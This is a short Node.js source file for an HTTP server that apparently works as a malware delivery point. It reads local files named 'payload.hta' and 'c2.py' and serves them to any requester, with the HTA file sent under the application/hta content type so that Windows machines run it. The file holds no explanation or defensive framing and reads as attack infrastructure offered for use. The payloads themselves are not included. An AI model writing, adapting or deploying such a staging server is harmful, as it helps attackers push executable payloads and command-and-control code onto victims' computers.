const http = require('http');
const fs = require('fs');
const path = require('path');
const PORT = process.env.PORT || 8080;

const htaContent = fs.readFileSync(path.join(__dirname, 'payload.hta'), 'utf8');
const c2Content = fs.readFileSync(path.join(__dirname, 'c2.py'), 'utf8');

const server = http.createServer((req, res) => {
    if (req.url.endsWith('.hta')) {
        res.writeHead(200, {'Content-Type': 'application/hta'});
        res.end(htaContent);
    } else if (req.url.endsWith('.py')) {
        res.writeHead(200, {'Content-Type': 'text/plain'});
        res.end(c2Content);
    } else {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('OK');
    }
});
server.listen(PORT, () => console.log('Listening on ' + PORT));
